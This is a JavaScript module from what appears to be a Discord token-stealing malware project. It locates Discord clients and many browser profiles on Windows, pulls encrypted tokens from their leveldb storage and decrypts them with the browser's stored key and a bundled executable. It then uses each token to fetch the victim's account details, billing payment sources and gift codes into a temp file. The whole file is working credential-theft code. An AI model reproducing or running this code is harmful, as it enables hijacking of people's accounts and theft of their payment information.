const { join } = require('path');
const { paths: { roamingAppData, localAppData } } = require('../util/variables');
const { execSync } = require('child_process');
const { readFileSync, existsSync, readdirSync, createReadStream, writeFileSync } = require('fs');
const readline = require('readline');
const os = require('os');
const { addDoubleQuotes } = require('../util/string');
const axios = require('axios');
const { tempFolder } = require('../index');
const { userAgent } = require('../config');

const tokens = [];
const paths = {
  'Discord': join(roamingAppData, 'discord'),
  'Discord Canary': join(roamingAppData, 'discordcanary'),
  'Lightcord': join(roamingAppData, 'Lightcord'),
  'Discord PTB': join(roamingAppData, 'discordptb'),
  'Opera': join(roamingAppData, 'Opera Software', 'Opera Stable'),
  'Opera GX': join(roamingAppData, 'Opera Software', 'Opera GX Stable'),
  'Amigo': join(localAppData, 'Amigo', 'User Data'),
  'Torch': join(localAppData, 'Torch', 'User Data'),
  'Kometa': join(localAppData, 'Kometa', 'User Data'),
  'Orbitum': join(localAppData, 'Orbitum', 'User Data'),
  'CentBrowse': join(localAppData, 'CentBrowser', 'User Data'),
  '7Sta': join(localAppData, '7Star', '7Star', 'User Data'),
  'Sputnik': join(localAppData, 'Sputnik', 'Sputnik', 'User Data'),
  'Vivaldi': join(localAppData, 'Vivaldi', 'User Data'),
  'Chrome': join(localAppData, 'Google', 'Chrome', 'User Data'),
  'Chrome SxS': join(localAppData, 'Google', 'Chrome SxS', 'User Data'),
  'Firefox': join(roamingAppData, 'Mozilla', 'Firefox', 'Profiles'),
  'Epic Privacy Browse': join(localAppData, 'Epic Privacy Browser', 'User Data'),
  'Microsoft Edge': join(localAppData, 'Microsoft', 'Edge', 'User Data'),
  'Uran': join(localAppData, 'uCozMedia', 'Uran', 'User Data'),
  'Yandex': join(localAppData, 'Yandex', 'YandexBrowser', 'User Data'),
  'Brave': join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data'),
  'Iridium': join(localAppData, 'Iridium', 'User Data')
};

const decryptToken = (token, key) => execSync([
  addDoubleQuotes(join(__dirname, '..', 'util', 'decrypt-token', 'decrypt_token.exe')), `--key "${key}"`, `--token "${token}"`
].join(' ')).toString();

const decryptRickRoll = (path) => {
  return new Promise(resolve => {
    const encryptedTokens = [];
    const localStatePath = join(path, 'Local State');
    const key = JSON.parse(readFileSync(localStatePath).toString())['os_crypt']['encrypted_key'];
    const levelDB = path.includes('cord') ? join(path, 'Local Storage', 'leveldb') : join(path, 'Default', 'Local Storage', 'leveldb');
    if (!existsSync(levelDB)) return;
    readdirSync(levelDB).map(f => {
      if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
      const readInterface = readline.createInterface({
        input: createReadStream(join(levelDB, f)), output: os.devNull, console: false
      });
      readInterface.on('line', (line) => {
        line.match(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/gi)?.map(token => {
          if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
          if (!encryptedTokens[token]) encryptedTokens.push(token);
        });
      });
      readInterface.on('close', () => {
        encryptedTokens.map(token => {
          token = decryptToken(token, key);
          if (!!token && !tokens.includes(token)) tokens.push(token);
        });
        resolve(tokens);
      });
    });
  });
};

module.exports = new Promise((resolve) => {
  Object.keys(paths).forEach(path => {
    if (!existsSync(paths[path])) return;
    else if (path.includes('Firefox')) {

    } else {
      decryptRickRoll(paths[path]).then(tokens => {
        tokens.map(token => {
          token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
          axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token, 'User-Agent': userAgent }
          })
            .then(res => {
              if (res.status !== 200) return;
              let json = res.data;
              json.token = token;
              let info = {};
              if (!info.accounts) info.accounts = []; info.accounts.push(json);
              writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));

              axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
                headers: { Authorization: token, 'User-Agent': userAgent }
              })
                .then(res => {
                  if (res.status !== 200) return;
                  const json = res.data;
                  let info = require(join(tempFolder, 'dsc_acc.json'));
                  if (!info.billing) info.billing = []; json.forEach(b => info.billing.push(b));
                  writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));

                  axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
                    headers: { Authorization: token, 'User-Agent': userAgent }
                  })
                    .then(res => {
                      if (res.status !== 200) return;
                      const json = res.data;
                      let info = require(join(tempFolder, 'dsc_acc.json'));
                      if (!info.gifts) info.gifts = []; json.forEach(g => info.gifts.push(g));
                      writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));

                      resolve();
                    })
                    .catch(() => {});
                })
                .catch(() => {});
            })
            .catch(() => {});
        });
      });
    }
  });
});
